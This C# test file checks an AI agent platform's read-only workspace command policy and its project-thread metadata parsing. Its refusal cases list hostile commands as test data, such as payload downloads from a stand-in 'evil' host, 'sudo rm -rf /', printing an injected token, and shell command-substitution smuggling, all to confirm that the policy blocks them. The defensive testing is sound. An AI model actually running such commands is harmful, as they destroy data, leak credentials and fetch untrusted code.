using AgentMesh.Core.Services;
using FluentAssertions;
using Xunit;

namespace AgentMesh.Tests.Core;

/// <summary>
/// The project-thread metadata contract: which session rows are read-only Q&amp;A threads, and what
/// survives a metadata round-trip.
/// </summary>
/// <remarks>
/// These keys ride <c>AgentSession.MetadataJson</c> and the dispatch payload instead of a column, so
/// this test class is the only place the "what counts as a thread" decision is pinned. The two failure
/// modes worth defending against are (a) a job turn misread as a thread — which would strip an agent's
/// write tools mid-job — and (b) a thread misread as writable — which is the whole point of the
/// feature. Both are argued per assertion below.
/// </remarks>
public class ProjectThreadContractTests
{
    [Fact]
    public void ProjectThreadIdentities_AreStableCamelCaseNames()
    {
        // The API writes these keys, the CLI reads them off the poll payload, and the dashboard shows
        // them. A rename is a wire break, so the literals are pinned here rather than referenced back
        // from the constants.
        ProjectThreadMetadata.WorkspaceAccessKey.Should().Be("workspaceAccess");
        ProjectThreadMetadata.ProjectIdKey.Should().Be("projectId");
        ProjectThreadMetadata.JobIdKey.Should().Be("jobId");
        WorkspaceAccessKinds.ReadOnly.Should().Be("readOnly");
        WorkspaceAccessKinds.ReadWrite.Should().Be("readWrite");
    }

    [Theory]
    // A thread: project-scoped, jobless, explicitly read-only.
    [InlineData("""{"projectId":"p1","workspaceAccess":"readOnly"}""", true)]
    // Job turn: has a job, so it is not a thread even if something stamped the access key.
    [InlineData("""{"projectId":"p1","jobId":"j1","workspaceAccess":"readOnly"}""", false)]
    // A read-only workspace on a jobless-but-projectless row is not a thread either: with no project
    // there is nothing to hold read-only against.
    [InlineData("""{"workspaceAccess":"readOnly"}""", false)]
    // Missing access key: project+jobless is a thread shape, but not an enforced read-only one.
    [InlineData("""{"projectId":"p1"}""", false)]
    // Read-write is opt-out made explicit; enforcement must stay off.
    [InlineData("""{"projectId":"p1","workspaceAccess":"readWrite"}""", false)]
    // An unrecognised value is not read-only (fail-open on the value space; see WorkspaceAccessKinds).
    [InlineData("""{"projectId":"p1","workspaceAccess":"yolo"}""", false)]
    // Malformed JSON must not throw on a read path and must not claim read-only status.
    [InlineData("{not json", false)]
    [InlineData("", false)]
    [InlineData(null, false)]
    public void IsReadOnlyProjectThread_OnlyForProjectScopedJoblessReadOnly(string? metadata, bool expected)
    {
        ProjectThreadMetadata.IsReadOnlyProjectThread(metadata).Should().Be(expected);
    }

    [Theory]
    [InlineData("readOnly", true)]
    [InlineData("readwrite", false)]
    // Case-insensitive because different call sites have written this key with different casing on
    // older rows; the readers all lowercase-compare.
    [InlineData("READONLY", true)]
    [InlineData(" ReadOnly ", true)]
    [InlineData("", false)]
    [InlineData("   ", false)]
    [InlineData(null, false)]
    public void IsReadOnlyAccessValue_IsCaseInsensitiveTrimmingAndExact(string? value, bool expected)
    {
        ProjectThreadMetadata.IsReadOnlyAccessValue(value).Should().Be(expected);
    }

    [Fact]
    public void ReadKeys_TolerantOfMissingMalformedAndNonStringValues()
    {
        // A non-string value is "absent", never a ToString(): the dispatch re-reads these on every
        // turn and a number or object under the key must not become a truthy string.
        ProjectThreadMetadata.ReadWorkspaceAccess("""{"workspaceAccess":42}""").Should().BeNull();
        ProjectThreadMetadata.ReadProjectId("""{"workspaceAccess":"readOnly"}""").Should().BeNull();
        ProjectThreadMetadata.ReadJobId("null").Should().BeNull();
        ProjectThreadMetadata.ReadProjectId("[]").Should().BeNull(); // array root is not an object

        // Case-insensitive key lookup matches the mixed-casing legacy rows.
        ProjectThreadMetadata.ReadWorkspaceAccess("""{"WorkspaceAccess":"readOnly"}""").Should().Be("readOnly");
        ProjectThreadMetadata.ReadProjectId("""{"ProjectId":"p1","JobId":null}""").Should().Be("p1");
        // JSON null is not a string, so jobId stays null: the row still reads as jobless.
        ProjectThreadMetadata.ReadJobId("""{"JobId":null}""").Should().BeNull();
    }

    [Fact]
    public void ReadWorkspaceAccess_DoesNotReadNestedObjects()
    {
        // {"settings":{"workspaceAccess":"readOnly"}} must NOT read as read-only: a nested blob is a
        // different contract and silently honouring it would let any caller smuggle the flag.
        ProjectThreadMetadata.ReadWorkspaceAccess("""{"settings":{"workspaceAccess":"readOnly"}}""")
            .Should().BeNull();
    }

    [Fact]
    public void WithWorkspaceAccess_StampsTheKeyAndPreservesTheRest()
    {
        var stamped = ProjectThreadMetadata.WithWorkspaceAccess(
            """{"projectId":"p1","workingDirectory":"/workspace/repos/acme","model":"gpt-4"}""",
            WorkspaceAccessKinds.ReadOnly);

        ProjectThreadMetadata.IsReadOnlyProjectThread(stamped).Should().BeTrue();
        ProjectThreadMetadata.ReadProjectId(stamped).Should().Be("p1");
        // Unknown keys survive verbatim: ExtractSessionSettings reads workingDirectory/model/effort on
        // every dispatch, and a stamp that dropped them would silently reset a thread's driver config.
        using (var doc = System.Text.Json.JsonDocument.Parse(stamped))
        {
            doc.RootElement.GetProperty("workingDirectory").GetString().Should().Be("/workspace/repos/acme");
            doc.RootElement.GetProperty("model").GetString().Should().Be("gpt-4");
        }
    }

    [Fact]
    public void WithWorkspaceAccess_ReplacesExistingValueAndSupportsRemoval()
    {
        var flipped = ProjectThreadMetadata.WithWorkspaceAccess(
            """{"workspaceAccess":"readWrite","projectId":"p1"}""", WorkspaceAccessKinds.ReadOnly);
        ProjectThreadMetadata.ReadWorkspaceAccess(flipped).Should().Be("readOnly");

        var removed = ProjectThreadMetadata.WithWorkspaceAccess(flipped, null);
        ProjectThreadMetadata.ReadWorkspaceAccess(removed).Should().BeNull();
        // Removal leaves the sibling keys alone, and the row degrades to a plain jobless session.
        ProjectThreadMetadata.ReadProjectId(removed).Should().Be("p1");
    }

    [Fact]
    public void WithWorkspaceAccess_OnGarbageProducesUsableObjectNotThrow()
    {
        // See the remarks on WithWorkspaceAccess: the writer's contract is "the marker survives"; junk
        // that no reader could parse is replaced, not preserved.
        var stamped = ProjectThreadMetadata.WithWorkspaceAccess("{not json", WorkspaceAccessKinds.ReadOnly);
        ProjectThreadMetadata.IsReadOnlyWorkspace(stamped).Should().BeTrue();
    }

    [Fact]
    public void JobTurnMetadataShape_StillReadsAsJobTurnNotThread()
    {
        // Verbatim shape JobTurnDispatcher writes (workspaceScope=job + jobId). If this ever starts
        // reading as a project thread, job agents lose their write tools.
        var jobTurn = """
                      {"projectId":"p1","jobId":"2a2a2a2a-2a2a-2a2a-2a2a-2a2a2a2a2a2a","workspaceScope":"job",
                       "workspaceGitRef":"mesh/job-1","personaId":"rook"}
                      """;
        ProjectThreadMetadata.IsProjectThread(jobTurn).Should().BeFalse();
        ProjectThreadMetadata.IsReadOnlyProjectThread(jobTurn).Should().BeFalse();
    }
}

/// <summary>
/// The read-only workspace command policy: what an inspection-only respondent may run, and what gets
/// refused with a named reason.
/// </summary>
/// <remarks>
/// The allow-list/default-deny split means the interesting assertions are the boundary pairs:
/// <c>git status</c> allowed vs <c>git commit</c> refused, <c>cat x</c> allowed vs <c>cat x &gt; y</c>
/// refused, <c>git log</c> allowed vs <c>git status &amp;&amp; git commit</c> refused (the exact hole
/// the old start-of-line regex left open). Each refusal is pinned to its rule id, not just to
/// "refused": the ids are what the hosts quote in logs and what the operator-visible policy table is
/// keyed by, so a silently re-keyed rule is a real regression.
/// </remarks>
public class ProjectThreadCommandPolicyTests
{
    [Theory]
    // Orientation and reading.
    [InlineData("pwd")]
    [InlineData("ls -la src/")]
    [InlineData("cat src/AgentMesh.Core/Services/ReadOnlyCommandPolicy.cs")]
    [InlineData("head -n 50 Program.cs")]
    [InlineData("tail -f -n 100 log.txt")]
    [InlineData("grep -rn \"interface\" src/")]
    [InlineData("rg -n \"TODO\" src")]
    [InlineData("find . -name \"*.cs\" -type f")]
    [InlineData("tree -L 2")]
    [InlineData("wc -l README.md")]
    [InlineData("stat appsettings.json")]
    [InlineData("file binary.dat")]
    [InlineData("du -sh .")]
    [InlineData("jq .name package.json")]
    // Pipes reshape a stream in memory; they never touch the tree.
    [InlineData("cat Program.cs | head -20")]
    [InlineData("grep -c error log.txt | sort | uniq -c")]
    [InlineData("git ls-files | grep '\\.cs$' | wc -l")]
    [InlineData("ps aux | grep dotnet")]
    // Logical connectors only sequence allowed commands — safe when every clause is safe.
    [InlineData("cd /workspace/repos/acme && ls")]
    [InlineData("ls; pwd")]
    // Repository inspection, including the -C form this codebase drives git through.
    [InlineData("git status")]
    [InlineData("git status --porcelain=v1 -uall")]
    [InlineData("git log --oneline -20")]
    [InlineData("git diff HEAD~1 -- src/")]
    [InlineData("git show abc123:README.md")]
    [InlineData("git blame -L 10,40 Program.cs")]
    [InlineData("git -C /workspace/repos/acme log --graph")]
    [InlineData("git rev-parse --short HEAD")]
    [InlineData("git ls-remote origin")]
    // Conditional reads: listing shapes.
    [InlineData("git branch")]
    [InlineData("git branch -a")]
    [InlineData("git branch --show-current")]
    [InlineData("git branch --contains abc123")]
    [InlineData("git tag")]
    [InlineData("git tag --list 'v1*'")]
    [InlineData("git remote -v")]
    [InlineData("git remote show origin")]
    [InlineData("git remote get-url origin")]
    [InlineData("git stash list")]
    [InlineData("git stash show -p")]
    [InlineData("git reflog")]
    [InlineData("git reflog show HEAD")]
    [InlineData("git worktree list")]
    [InlineData("git config user.name")]
    [InlineData("git config --get remote.origin.url")]
    [InlineData("git config --list")]
    // Descriptor plumbing is not a file write; without this exemption `git log 2>&1 | head` dies.
    [InlineData("git log --oneline 2>&1 | head -20")]
    [InlineData("rg secret src/ 2>/dev/null")]
    [InlineData("grep nothing file.txt >/dev/null")]
    // gh reads.
    [InlineData("gh pr list")]
    [InlineData("gh pr view 42")]
    [InlineData("gh run list --limit 5")]
    [InlineData("gh status")]
    // Quoting makes the operators inside it data: grep 'a && b' is ONE clause with a pattern.
    [InlineData("grep 'a;b' file.cs")]
    [InlineData("grep \"a && b\" file.cs")]
    [InlineData("echo \"hello > world\"")]
    [InlineData("echo 'do not run rm' ")]
    // Comments are dropped exactly like a shell drops them.
    [InlineData("git log # check recent history")]
    // A wrapper over an allowed command is still allowed.
    [InlineData("env FOO=bar git status")]
    [InlineData("time git log --oneline -5")]
    // NOTE: no bare-`env` case here: `env` dumps injected credentials and is refused on the deny
    // side below; only `env <allowed command>` passes, via wrapper unwrapping.
    // Absolute paths match on basename.
    [InlineData("/usr/bin/cat README.md")]
    [InlineData("./vendor/tools/rg -n pattern src")]
    // curl GETs are read-only network inspection.
    [InlineData("curl -s https://example.com/api/health")]
    [InlineData("curl -sfL https://example.com | head -5")]
    public void Allowed(string command)
    {
        var decision = ReadOnlyCommandPolicy.Evaluate(command);
        decision.IsAllowed.Should().BeTrue(
            $"'{command}' should be allowed but was refused [{decision.MatchedRule}]: {decision.Reason}");
    }

    [Theory]
    // File mutation, the core of the denylist.
    [InlineData("rm file.txt", "mutation-denylist:rm")]
    [InlineData("rm -rf build/", "mutation-denylist:rm")]
    [InlineData("mv a.txt b.txt", "mutation-denylist:mv")]
    [InlineData("cp a.txt b.txt", "mutation-denylist:cp")]
    [InlineData("mkdir new-dir", "mutation-denylist:mkdir")]
    [InlineData("touch src/New.cs", "mutation-denylist:touch")]
    [InlineData("tee out.txt", "mutation-denylist:tee")]
    [InlineData("ln -s real link", "mutation-denylist:ln")]
    [InlineData("chmod 777 x.sh", "mutation-denylist:chmod")]
    [InlineData("truncate -s 0 big.log", "mutation-denylist:truncate")]
    // Builds and tests write obj/ and bin/ into the checkout: refused by design, loudly.
    [InlineData("dotnet build src/AgentMesh.Core -c Release", "mutation-denylist:dotnet")]
    [InlineData("dotnet test tests/AgentMesh.Tests --filter ProjectThread", "mutation-denylist:dotnet")]
    [InlineData("npm install", "mutation-denylist:npm")]
    [InlineData("make", "mutation-denylist:make")]
    // Shells and interpreters can write without naming a write.
    [InlineData("bash -c 'echo hi'", "mutation-denylist:bash")]
    [InlineData("python3 script.py", "mutation-denylist:python3")]
    [InlineData("sh -c \"cat x\"", "mutation-denylist:sh")]
    [InlineData("awk 'BEGIN{print \"x\" > \"f\"}' ", "mutation-denylist:awk")]
    [InlineData("node index.js", "mutation-denylist:node")]
    // Editors and pagers carry shell escapes.
    [InlineData("vim README.md", "mutation-denylist:vim")]
    [InlineData("less big.log", "mutation-denylist:less")]
    // Output redirection: the leader being allowed does not save the clause.
    [InlineData("cat x.cs > out.txt", "shell-metachar:output-redirection")]
    [InlineData("echo hi >> notes.md", "shell-metachar:output-redirection")]
    [InlineData("ls > listing.txt", "shell-metachar:output-redirection")]
    // Substitutions smuggle programs this policy cannot see.
    [InlineData("cat $(find . -name secret)", "shell-metachar:command-substitution")]
    [InlineData("echo `whoami`", "shell-metachar:command-substitution")]
    [InlineData("grep \"$(rm x)\" f.cs", "shell-metachar:command-substitution")]
    // Process substitution is the same smuggling with a pipe.
    [InlineData("diff <(git show HEAD:f) f", "shell-metachar:process-substitution")]
    // Input redirection names a file implicitly; refuse rather than track which leaders can read it.
    [InlineData("sort < data.txt", "shell-metachar:input-redirection")]
    [InlineData("grep x <<< \"y\"", "shell-metachar:input-redirection")]
    // Git mutations, including the ones the old Stage-1 regex never matched.
    [InlineData("git commit -m x", "git-mutation:commit")]
    [InlineData("git push origin main", "git-mutation:push")]
    [InlineData("git checkout src/X.cs", "git-mutation:checkout")]
    [InlineData("git checkout -b feature", "git-mutation:checkout")]
    [InlineData("git restore .", "git-mutation:restore")]
    [InlineData("git reset --hard HEAD~1", "git-mutation:reset")]
    [InlineData("git clean -fd", "git-mutation:clean")]
    [InlineData("git stash push", "git-mutation:stash-push")]
    [InlineData("git stash", "git-mutation:stash-push")]
    [InlineData("git add .", "git-mutation:add")]
    [InlineData("git rm x.cs", "git-mutation:rm")]
    [InlineData("git fetch origin", "git-mutation:fetch")]
    [InlineData("git pull", "git-mutation:pull")]
    [InlineData("git merge other", "git-mutation:merge")]
    [InlineData("git rebase main", "git-mutation:rebase")]
    [InlineData("git cherry-pick abc", "git-mutation:cherry-pick")]
    [InlineData("git worktree add ../x", "git-mutation:worktree")]
    [InlineData("git remote set-url origin evil", "git-mutation:remote-set-url")]
    [InlineData("git config user.email x@y", "git-mutation:config-set")]
    [InlineData("git config --unset user.name", "git-mutation:config-unset")]
    [InlineData("git tag v1.0", "git-mutation:tag-create")]
    [InlineData("git tag -a v2 -m msg", "git-mutation:tag-a")]
    [InlineData("git branch feature/x", "git-mutation:branch-create")]
    [InlineData("git branch -D old", "git-mutation:branch-d")]
    [InlineData("git bisect start", "git-mutation:bisect")]
    [InlineData("git --git-dir .git status --ignored; git commit -m x", "git-mutation:commit")]
    // Conditional reads with write-shaped arguments.
    [InlineData("git log --output=history.txt", "mutation-flag:git:output")]
    [InlineData("git tag --format='%(contents)%(!evil.sh)i'", "git-mutation:tag-format-interpreter")]
    // Chained clauses: every hole the start-of-line-only regex had.
    [InlineData("git status && git commit -m x", "git-mutation:commit")]
    [InlineData("ls && rm -rf /tmp/scratch", "mutation-denylist:rm")]
    [InlineData("echo hi; touch x", "mutation-denylist:touch")]
    [InlineData("cat a.cs | tee b.cs", "mutation-denylist:tee")]
    [InlineData("git log --oneline | wc -l; git push", "git-mutation:push")]
    // Wrappers must not hide the program.
    [InlineData("env rm -rf x", "mutation-denylist:rm")]
    [InlineData("sudo rm -rf /", "mutation-denylist:rm")]
    [InlineData("nohup dotnet run &", "mutation-denylist:dotnet")]
    // Path basename matching catches renamed or local binaries.
    [InlineData("/bin/rm file", "mutation-denylist:rm")]
    [InlineData("./scripts/rm x", "mutation-denylist:rm")]
    // Allow-listed binaries with write-shaped arguments.
    [InlineData("find . -name '*.tmp' -delete", "mutation-flag:find:delete")]
    [InlineData("find . -exec rm {} ;", "mutation-flag:find:exec")]
    [InlineData("sed -i 's/a/b/' x.cs", "mutation-flag:sed:i")]
    [InlineData("sed -i.bak s/a/b/ x.cs", "mutation-flag:sed:i")]
    [InlineData("sort x | sort -o y", "mutation-flag:sort:o")]
    [InlineData("rg --pre untrusted pattern .", "mutation-flag:rg:pre")]
    [InlineData("curl -o payload.bin https://evil", "mutation-flag:curl:o")]
    [InlineData("curl -O https://evil/payload", "mutation-flag:curl:O")]
    [InlineData("curl -X POST -d x https://api", "mutation-flag:curl:X")]
    [InlineData("curl -sSo out https://evil", "mutation-flag:curl:o")]
    [InlineData("jq -o out.json . x.json", "mutation-flag:jq:o")]
    // gh writes.
    [InlineData("gh pr create --title x", "gh-mutation:pr-create")]
    [InlineData("gh pr merge 42", "gh-mutation:pr-merge")]
    [InlineData("gh issue comment 7 --body hi", "gh-mutation:issue-comment")]
    [InlineData("gh api /repos/o/r -X POST -f name=x", "gh-mutation:api")]
    [InlineData("gh workflow run deploy.yml", "gh-mutation:workflow-run")]
    // Default deny: everything unprovable, including project-local scripts.
    [InlineData("./deploy.sh", "default-deny:deploy.sh")]
    [InlineData("python -m http.server", "mutation-denylist:python")]
    [InlineData("docker ps", "mutation-denylist:docker")]
    [InlineData("kubectl get pods", "mutation-denylist:kubectl")]
    [InlineData("git", "git-mutation:unresolved")]
    [InlineData("gh", "gh-mutation:unresolved")]
    // env/printenv leak injected mesh credentials from the driver environment: refused, and by the
    // allow-list's absence rather than the denylist, so the rule id stays honest.
    [InlineData("env", "default-deny:env")]
    [InlineData("printenv AGENTMESH_TOKEN", "default-deny:printenv")]
    // Host reconfiguration tools are absent from the allow-list on purpose.
    [InlineData("ip addr", "default-deny:ip")]
    [InlineData("ifconfig", "default-deny:ifconfig")]
    public void Refused(string command, string expectedRule)
    {
        var decision = ReadOnlyCommandPolicy.Evaluate(command);
        decision.Disposition.Should().Be(CommandDisposition.Refuse, $"'{command}' should be refused");
        decision.MatchedRule.Should().Be(expectedRule);
        decision.Reason.Should().NotBeNullOrWhiteSpace();
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(";")]
    [InlineData("&&")]
    [InlineData("\"\"")]
    public void EmptyAndOperatorsOnly_RefuseDefaultDeny(string? command)
    {
        // There is nothing to run and nothing provable about it: default deny, never a silent allow.
        var decision = ReadOnlyCommandPolicy.Evaluate(command);
        decision.IsRefused.Should().BeTrue();
        decision.MatchedRule.Should().BeOneOf("empty-command", "default-deny");
    }

    [Fact]
    public void EveryDocumentedGhWriteVerb_IsActuallyRefused()
    {
        // MutatingGhSubcommands is hand-maintained prose transcribed from `gh --help`, and the last
        // transcription silently dropped "issue comment" (it fell to default-deny, so behaviour looked
        // fine while the rule id lied about *why*). Asserting each pair against the deny rule — not
        // merely against "refused" — is what makes a dropped entry fail loudly instead of quietly
        // changing its reason string.
        foreach (var verb in ReadOnlyCommandPolicy.MutatingGhSubcommands)
        {
            var command = verb == "api" ? "api /repos/o/r" : verb;
            var decision = ReadOnlyCommandPolicy.Evaluate($"gh {command}");
            decision.MatchedRule.Should().Be($"gh-mutation:{verb.ToLowerInvariant().Replace(' ', '-')}",
                $"'gh {verb}' must be refused by the gh deny-list, not by default deny");
        }
    }

    [Fact]
    public void EveryDocumentedGitWriteSubcommand_IsActuallyRefused()
    {
        // Same argument as the gh sweep: MutatingGitSubcommands entries are matched by name, so a
        // typo silently downgrades a specific refusal to the unresolved/default-deny path.
        foreach (var sub in ReadOnlyCommandPolicy.MutatingGitSubcommands)
        {
            var decision = ReadOnlyCommandPolicy.Evaluate($"git {sub} --some-operand");
            decision.MatchedRule.Should().Be($"git-mutation:{sub.ToLowerInvariant()}",
                $"'git {sub}' must be refused by the git deny-list");
        }
    }

    [Fact]
    public void DenylistAndAllowlist_DoNotOverlap()
    {
        // A program in both lists would be refused by pass 2 before its allow-list entry could ever
        // fire, so the allow-list entry is a lie — and worse, flipping a denylist entry would
        // silently enable a name the operator thinks is still denied. The lists must stay disjoint.
        // (The "never matches" entries from the draft, e.g. "perl-write", would also hide here.)
        var overlap = ReadOnlyCommandPolicy.MutationCommands
            .Intersect(ReadOnlyCommandPolicy.InspectionCommands, StringComparer.OrdinalIgnoreCase)
            .ToList();
        overlap.Should().BeEmpty();

        // Same for the two git tables: a subcommand in both makes pass-1 and pass-4 disagree.
        ReadOnlyCommandPolicy.MutatingGitSubcommands
            .Intersect(ReadOnlyCommandPolicy.InspectionGitSubcommands, StringComparer.OrdinalIgnoreCase)
            .Should().BeEmpty();
        ReadOnlyCommandPolicy.MutatingGhSubcommands
            .Intersect(ReadOnlyCommandPolicy.InspectionGhSubcommands, StringComparer.OrdinalIgnoreCase)
            .Should().BeEmpty();
    }

    [Fact]
    public void Allowlist_ContainsTheCanonicalInspectionVocabulary()
    {
        // The refusal message promises this exact set to the model; if the message and the list ever
        // disagree, the model is told to use a tool it will be refused for.
        var promised = new[] { "cat", "head", "tail", "grep", "rg", "find", "ls", "tree", "sed", "diff", "jq", "wc", "sort" };
        ReadOnlyCommandPolicy.InspectionCommands.Should().Contain(promised);
    }

    [Theory]
    [InlineData("dotnet build src/AgentMesh.Core -c Release", "mutation-denylist:dotnet")]
    [InlineData("dotnet test tests/AgentMesh.Tests --filter ProjectThread", "mutation-denylist:dotnet")]
    public void RefusalMessage_NamesTheRuleAndSendsTheModelToAHuman(string command, string rule)
    {
        var decision = ReadOnlyCommandPolicy.Evaluate(command);
        decision.IsRefused.Should().BeTrue();

        var message = ReadOnlyCommandPolicy.RefusalMessage(command, decision);

        // The id must be quoted so it can be grepped out of a transcript and matched to a policy array.
        message.Should().Contain($"[{rule}]");
        // The most important words on this path: "open a job" — the escalation the feature exists to
        // point at when an answer genuinely needs the tree to change.
        message.Should().Contain("open a job");
        message.Should().Contain("Do not retry");
        message.Should().Contain(command);
    }

    [Fact]
    public void RefusalMessage_RejectsAllowedDecisions()
    {
        var allowed = ReadOnlyCommandPolicy.Evaluate("git status");
        allowed.IsAllowed.Should().BeTrue();
        var act = () => ReadOnlyCommandPolicy.RefusalMessage("git status", allowed);
        act.Should().Throw<ArgumentException>().WithMessage("*no refusal message*");
    }

    [Fact]
    public void Decision_AllowCarriesNoReason()
    {
        var decision = ReadOnlyCommandPolicy.Evaluate("ls");
        decision.Disposition.Should().Be(CommandDisposition.Allow);
        decision.Reason.Should().BeNull();
        decision.MatchedRule.Should().Be("inspection-allow-list");
    }
}
